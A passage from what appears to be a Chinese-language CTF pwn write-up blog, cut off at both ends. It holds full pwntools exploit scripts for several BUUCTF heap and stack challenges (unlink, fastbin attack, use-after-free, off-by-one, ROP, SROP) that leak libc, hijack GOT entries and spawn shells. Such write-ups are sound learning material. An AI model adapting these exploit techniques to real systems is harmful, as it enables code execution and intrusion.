libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line">  </span><br><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="x02-一些思考">0x02 一些思考</h2>
<ol type="1">
<li>本题还可以有以下几种打法
<ol type="1">
<li>泄露地址方面：不仅可以用puts，还可以用write；讲道理一切能输出到终端的函数都可以利用来泄露内容，后续慢慢探索</li>
<li>泄露地址后，我们可以用og进行提权</li>
</ol></li>
<li>一些工具的使用
<ol type="1">
<li>flat可以用来构造payload</li>
</ol></li>
</ol>
<h2 id="x03-一些问题">0x03 一些问题</h2>
<ol type="1">
<li>0x01
中第七步payload，为什么在send时只能是sendline，我看received的结果明明都一样啊</li>
<li>0x01
中第九步payload，puts为什么不会打印后面的内容了（代码底部'注2'）？为什么puts_got后面一定是可以被转换为0a的00？</li>
<li>0x01 中第12步payload，为什么需要sys_addr + 0 +
bin_sh，这个0是sys_addr的返回地址吗？</li>
<li>网上很多博客都用LibcSearcher，可是我在将LibcSearcher数据库更新到最新版本以后还是无法查到对应libc库，很奇怪</li>
</ol>
<h1 id="x03-buuctf-hitcontraining_bamboobox">0x03 buuctf
hitcontraining_bamboobox</h1>
<h2 id="poc">POC</h2>
<p>这题看反汇编代码有个 magic，应该用 House of Force，但是 buu 喜欢把
flag 放在 / 目录下，所以题目提供的 magic 函数就失效了</p>
<p>所以用 unlink 修改堆表，使我们可以实现任意地址写</p>
<h2 id="exp">exp</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28090&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./bamboobox&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def show():</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def alloc(size, content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;item name:&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;name of item:&#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def edit(idx, size, content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index of item:&#x27;, str(idx))</span><br><span class="line">  io.sendlineafter(&#x27;length of item name:&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;name of the item:&#x27;, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;index of item:&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x40,&#x27;a&#x27;*8 )         # 0</span><br><span class="line">alloc(0x80,&#x27;b&#x27; * 8)        # 1</span><br><span class="line">alloc(0x80,&#x27;c&#x27; * 8)        # 2</span><br><span class="line">alloc(0x20,&#x27;/bin/sh\x00\x00\x00\x00&#x27;)  # 3</span><br><span class="line"></span><br><span class="line">ptr=0x6020c8</span><br><span class="line">fd=ptr-0x18</span><br><span class="line">bk=ptr-0x10</span><br><span class="line"></span><br><span class="line">fake_chunk=p64(0)</span><br><span class="line">fake_chunk+=p64(0x41)</span><br><span class="line">fake_chunk+=p64(fd)</span><br><span class="line">fake_chunk+=p64(bk)</span><br><span class="line">fake_chunk+=b&#x27;\x00&#x27;*0x20</span><br><span class="line">fake_chunk+=p64(0x40)</span><br><span class="line">fake_chunk+=p64(0x90)</span><br><span class="line"></span><br><span class="line">edit(0,len(fake_chunk),fake_chunk)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free_got=elf.got[&#x27;free&#x27;]</span><br><span class="line">payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got)</span><br><span class="line"></span><br><span class="line">edit(0,len(payload1),payload1)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">free_addr=u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8,b&#x27;\x00&#x27;)) </span><br><span class="line">libc=LibcSearcher(&#x27;free&#x27;,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(&#x27;free&#x27;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr   ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">edit(0,0x8,p64(sys_addr))</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x04-hitcontraining_uaf">0x04 hitcontraining_uaf</h1>
<p>Ⅰ. 所用知识点：<br />
1. 逆向分析（这个题逆向太坐牢了，pseudocode太恶心，只能一点一点看） 2.
利用fastbin性质实现 3. UAF</p>
<p>Ⅱ. EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25676</span><br><span class="line">file = &#x27;./hacknote&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./hacknote&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;,content)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def print(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x10,&#x27;aaaa&#x27;)</span><br><span class="line">alloc(0x10,&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">get_shell = 0x8048945</span><br><span class="line">alloc(0x8,p32(get_shell))</span><br><span class="line">print(0)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p>Ⅲ. 解题感言
这个题该说是出的很灵活还是很逆天...想要发现利用点需要比较扎实的逆向功底才行。其次还要对fastbin对于不同大小的chunk的分配问题有比较深入的了解。</p>
<h1 id="x05-hitcontraining_magicheap">0x05 hitcontraining_magicheap</h1>
<p>Ⅰ. 所用知识点<br />
1. 利用fastbin的FFSL进行任意地址写</p>
<p>Ⅱ. EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 29259</span><br><span class="line">file = &#x27;./magicheap&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./magicheap&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap:&#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap : &#x27;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">fake_chunk = 0x60208d</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x60,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x40,&#x27;\x00&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">payload = p64(0)*3 + p64(0x71) + p64(fake_chunk)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(0x60,&#x27;aaaa&#x27;)</span><br><span class="line">alloc(0x60,&#x27;aaaaaaaa&#x27;)</span><br><span class="line">io.sendline(str(4869))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"> </span><br></pre></td></tr></table></figure></p>
<p>Ⅲ. 解题感言<br />
四道堆题了，这是第一道自己做出来的堆题<br />
我做Pwn的整体习惯是边打边学，没有说是先学再打<br />
这道题整体感觉跟[ZJCTF
2019]EasyHeap非常像，不过133t函数里藏的是真flag，不用去泄露libc地址劫持malloc_hook了<br />
因为特别像所以就考虑用fastbin
attack打，事实上我到现在也不太清楚这算不算fastbin attack<br />
只是利用了堆溢出和从fastbin里申请chunk的特性进行了一个任意地址的写<br />
解决了babyheap那道题里不清楚的一个点(为什么在0x..aed申请fake_chunk)<br />
这道题网上还有unsortedbin attack，抽空学一下</p>
<h1 id="x06-ciscn_2019_n_3">0x06 ciscn_2019_n_3</h1>
<p>Ⅰ. 所用知识点<br />
1. UAF</p>
<p>Ⅱ. EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 26279</span><br><span class="line">file = &#x27;./ciscn_2019_n_3&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./ciscn_2019_n_3&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,content):</span><br><span class="line">  io.sendlineafter(&#x27;CNote &gt; &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Type &gt; &#x27; , str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Value &gt; &#x27;, content)</span><br><span class="line"></span><br><span class="line">def alloc(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;CNote &gt; &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Type &gt; &#x27; , str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Length &gt; &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Value &gt; &#x27;, content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;CNote &gt; &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0,0x10,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">alloc(1,0x10,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">sys_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">payload = b&#x27;bash&#x27;+p32(sys_plt)</span><br><span class="line">alloc(2,0xc,payload)</span><br><span class="line">delete(1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p>Ⅲ.解题感言<br />
第二道自己做的heap，总体感觉前两页的heap都属于签到</p>
<h1 id="x07-babyfengshui_33c3_2016">0x07 babyfengshui_33c3_2016</h1>
<p>Ⅰ. 所用知识 1. 逆向分析：奇葩的堆溢出检测方式</p>
<p>Ⅱ.完整EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 28267</span><br><span class="line">file = &#x27;./babyfengshui_33c3_2016&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./babyfengshui_33c3_2016&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ----------------------------------------------------------</span><br><span class="line">def alloc(hsize,name,wsize,desc):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(0))</span><br><span class="line">  io.sendlineafter(&#x27;description: &#x27;, str(hsize))</span><br><span class="line">  io.sendlineafter(&#x27;name: &#x27; , name)</span><br><span class="line">  io.sendlineafter(&#x27;length: &#x27;, str(wsize))</span><br><span class="line">  io.sendlineafter(&#x27;text: &#x27;,desc)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">def edit(index,wsize,desc):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;length: &#x27;, str(wsize))</span><br><span class="line">  io.sendlineafter(&#x27;text: &#x27;,desc)</span><br><span class="line"># ----------------------------------------------------------</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">alloc(0x80,&#x27;aaaa&#x27;,0x80,&#x27;bbbb&#x27;)</span><br><span class="line">alloc(0x80,&#x27;aaaa&#x27;,0x80,&#x27;bbbb&#x27;)</span><br><span class="line">alloc(0x8,&#x27;aaaa&#x27;,0x8,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(0)</span><br><span class="line">alloc(0x100,&#x27;a&#x27;,0x80,&#x27;a&#x27;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x108 + b&#x27;a&#x27;*8 + b&#x27;a&#x27;*0x80 + b&#x27;a&#x27;*8 + p32(free_got)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">edit(3,0x200,payload)</span><br><span class="line">dump(1)</span><br><span class="line">io.recvuntil(&#x27;description: &#x27;)</span><br><span class="line">free_addr = u32(io.recv(4))</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[&#x27;free&#x27;]</span><br><span class="line">sys_addr  = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">edit(1,0x80,p32(sys_addr))</span><br><span class="line">delete(2)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure></p>
<p>Ⅲ. summary 1.
好难...逆向以后本来就一大堆指针和函数调用，关系理都理不清还要利用，这道题的exp利用了“函数堆中利用指针去读写“的逻辑去覆写free_got的地址
2. 一些问题 1.
为什么LibcSearcher在本地就能查到正确的基址成功提权，到远程就不行了？ 1.
在本地freegot指向了540，而远端是750，本地libc版本号能查对，说明远端有什么问题
2. 那么这个问题是什么呢？</p>
<h1 id="x08-hitcontraining_heapcreator">0x08
hitcontraining_heapcreator</h1>
<p>Ⅰ. 解题知识点 1. off-by-one</p>
<p>Ⅱ. 完整EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25756</span><br><span class="line">file = &#x27;./heapcreator&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./heapcreator&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap:&#x27;, content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;heap :&#x27;, content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">alloc(0x18,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27; + p64(0)*2 + p64(0x81)</span><br><span class="line">edit(0,payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = p64(0)*8 + p64(0x8) + p64(free_got)</span><br><span class="line">alloc(0x70,payload)</span><br><span class="line">show(2)</span><br><span class="line">io.recvuntil(&#x27;Content : &#x27;)</span><br><span class="line">free_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;free&#x27;,free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(&#x27;free&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">payload = p64(sys_addr)</span><br><span class="line">edit(2,payload)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure></p>
<p>Ⅲ. summary AK第二页<sub>完结撒flag</sub>
这道题基本就只把上一道题堆溢出检测改为off-by-one，其他基本没啥变动，可以算是第三道自己解出来的heap题~</p>
<h1 id="x09-hitcon2014_stkof">0x09 hitcon2014_stkof</h1>
<p>Ⅰ.知识点 1. unlink 2. 不关闭I/O缓冲区的后果</p>
<p>Ⅱ. 完整EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 26280</span><br><span class="line">file = &#x27;./stkof&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./stkof&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc_repo2elf/64libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendline(&#x27;1&#x27;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(&#x27;OK\n&#x27;)</span><br><span class="line">    </span><br><span class="line">def fill(idx, content):</span><br><span class="line">    io.sendline(&#x27;2&#x27;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(len(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(&#x27;OK\n&#x27;)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    io.sendline(&#x27;3&#x27;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x30)</span><br><span class="line">alloc(0x30)</span><br><span class="line">alloc(0x80)</span><br><span class="line">alloc(0x30)</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">target = 0x602140 + 0x10</span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target - 0x10</span><br><span class="line"></span><br><span class="line">payload = p64(0) + p64(0x30)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += b&quot;a&quot;*0x10</span><br><span class="line"></span><br><span class="line">payload += p64(0x30) + p64(0x90)</span><br><span class="line">fill(2,payload)</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*0x10</span><br><span class="line">payload += p64(free_got) + p64(puts_got)</span><br><span class="line">fill(2,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">fill(1,payload)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:]+b&#x27;\x00\x00&#x27;)</span><br><span class="line"># log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">fill(1,payload)</span><br><span class="line"></span><br><span class="line">fill(4,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="x0a-jarvisoj_level5">0x0A jarvisoj_level5</h1>
<p>国赛前复习一下栈题是怎么打的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28090&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./level3_x64&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = b&#x27;a&#x27; * (0x80 + 8) + p64(pop_rdi_ret) + p64(1)</span><br><span class="line">p1 += p64(pop_rsi_r15_ret) + p64(write_got) + p64(0)</span><br><span class="line">p1 += p64(write_plt) + p64(main_addr)</span><br><span class="line">io.sendline(p1)</span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;write_addr   ---&gt;   &#x27; + hex(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line">sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * (0x80 + 8) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="x0b-ciscn_2019_es_7">0x0B ciscn_2019_es_7</h1>
<p>SROP,pwntools的集成真香</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28329&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./ciscn_2019_es_7&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">vuln_addr = 0x4004f1</span><br><span class="line">sig_return = 0x4004da</span><br><span class="line">execve_addr = 0x4004e2</span><br><span class="line">syscall_ret = 0x400517</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">bin_sh = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = bin_sh.ljust(0x10,b&#x27;a&#x27;)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&quot;stack_addr   =&gt;   &quot;,hex(stack_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = stack_addr - 328</span><br><span class="line">print(&quot;bin_sh_addr   =&gt;   &quot;,hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload  = bin_sh.ljust(0x10,b&#x27;a&#x27;)</span><br><span class="line">payload += p64(sig_return)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = 